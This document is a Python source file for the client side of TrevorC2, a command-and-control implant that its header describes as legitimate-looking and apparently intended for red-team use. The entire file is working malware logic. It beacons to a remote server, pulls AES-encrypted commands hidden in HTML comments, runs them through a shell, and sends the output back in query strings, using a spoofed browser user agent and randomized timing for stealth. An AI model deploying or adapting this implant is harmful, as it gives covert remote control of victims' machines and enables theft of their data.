#!/usr/bin/env python
#
# TrevorC2 - legitimate looking command and control 
# Written by: Dave Kennedy @HackingDave
# Website: https://www.trustedsec.com
# GIT: https://github.com/trustedsec
#
# This is the client connection, and only an example. Refer to the readme 
# to build your own client connection to the server C2 infrastructure.

# CONFIG CONSTANTS:

# site used to communicate with (remote TrevorC2 site)
SITE_URL = ("http://127.0.0.1")

# THIS IS WHAT PATH WE WANT TO HIT FOR CODE - YOU CAN MAKE THIS ANYTHING EXAMPLE: /index.aspx (note you need to change this as well on trevorc2_server)
ROOT_PATH_QUERY = ("/")

# THIS FLAG IS WHERE THE CLIENT WILL SUBMIT VIA URL AND QUERY STRING GET PARAMETER
SITE_PATH_QUERY = ("/images")

# THIS IS THE QUERY STRING PARAMETER USED
QUERY_STRING = ("guid=")

# STUB FOR DATA - THIS IS USED TO SLIP DATA INTO THE SITE, WANT TO CHANGE THIS SO ITS NOT STATIC
STUB = ("oldcss=")

# time_interval is the time used between randomly connecting back to server, for more stealth, increase this time a lot and randomize time periods
time_interval1 = 2
time_interval2 = 8

# THIS IS OUR ENCRYPTION KEY - THIS NEEDS TO BE THE SAME ON BOTH SERVER AND CLIENT FOR APPROPRIATE DECRYPTION. RECOMMEND CHANGING THIS FROM THE DEFAULT KEY
CIPHER = ("Tr3v0rC2R0x@nd1s@w350m3#TrevorForget")

# DO NOT CHANGE BELOW THIS LINE


# python 2/3 compatibility, need to move this to python-requests in future
try: 
    import urllib2 as urllib
    py = "2"
except: 
    import urllib.request, urllib.parse, urllib.error
    py = "3"
import random
import base64
import time
import subprocess
import hashlib
from Crypto import Random
from Crypto.Cipher import AES
import sys
import platform

# AES Support for Python2/3 - http://depado.markdownblog.com/2015-05-11-aes-cipher-with-python-3-x
class AESCipher(object):
    """
    A classical AES Cipher. Can use any size of data and any size of password thanks to padding.
    Also ensure the coherence and the type of the data with a unicode to byte converter.
    """
    def __init__(self, key):
        self.bs = 16
        self.key = hashlib.sha256(AESCipher.str_to_bytes(key)).digest()

    @staticmethod
    def str_to_bytes(data):
        u_type = type(b''.decode('utf8'))
        if isinstance(data, u_type):
            return data.encode('utf8')
        return data

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * AESCipher.str_to_bytes(chr(self.bs - len(s) % self.bs))

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]

    def encrypt(self, raw):
        raw = self._pad(AESCipher.str_to_bytes(raw))
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw)).decode('utf-8')

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')


# establish cipher
cipher = AESCipher(key=CIPHER)


# random interval for communication
def random_interval(time_interval1, time_interval2):
    return random.randint(time_interval1, time_interval2)

hostname = platform.node()

# we need to registery our asset first
while 1:
    time.sleep(1)
    try:
        hostname_send  = cipher.encrypt("magic_hostname=" + hostname).encode('utf-8')
        hostname_send = base64.b64encode(hostname_send).decode('utf-8')

        # pipe out stdout and base64 encode it then request via a query string parameter
        if py == "3":
            req = urllib.request.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + hostname_send, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
            html = urllib.request.urlopen(req).read()
            break

        else:
            req = urllib.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + hostname_send, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
            html = urllib.urlopen(req).read()
            break

    # handle exceptions and pass if the server is unavailable, but keep going
    except Exception as error:
        # if we can't communicate, just pass
        if "Connection refused" in str(error):
            pass
        else:
            print("[!] Something went wrong, printing error: " + str(error))

# main call back here
while 1:
    try:
        time.sleep(random_interval(time_interval1, time_interval2))
        # request with specific user agent
        if py == "3":
            req = urllib.request.Request(SITE_URL + ROOT_PATH_QUERY, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
            html = urllib.request.urlopen(req).read().decode('utf-8')
        else:
            req = urllib.Request(SITE_URL + ROOT_PATH_QUERY, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
            html = urllib.urlopen(req).read().decode('utf-8')

        # <!-- PARAM=bm90aGluZw== --></body> -  What we split on here on encoded site
        parse = html.split("<!-- %s" % (STUB))[1].split("-->")[0]
        parse = cipher.decrypt(parse)
        if parse == "nothing": pass
        else:
            if hostname in parse:
                parse = parse.split(hostname + "::::")[1]
                # execute our parsed command
                proc = subprocess.Popen(parse, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout_value = proc.communicate()[0]
                stdout_value = cipher.encrypt(hostname + "::::" + stdout_value).encode('utf-8')
                stdout_value = base64.b64encode(stdout_value).decode('utf-8')

                # pipe out stdout and base64 encode it then request via a query string parameter
                if py == "3":
                    req = urllib.request.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + stdout_value, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
                    html = urllib.request.urlopen(req).read()

                else:
                    req = urllib.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + stdout_value, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
                    html = urllib.urlopen(req).read()

                # sleep random interval and let cleanup on server side
                time.sleep(random_interval(time_interval1, time_interval2))

    # handle exceptions and pass if the server is unavailable, but keep going
    except Exception as error:
        # if we can't communicate, just pass
        if "Connection refused" in str(error):
            pass
        else:
            print("[!] Something went wrong, printing error: " + str(error))

    except KeyboardInterrupt:
        print ("\n[!] Exiting TrevorC2 Client...")
        sys.exit()
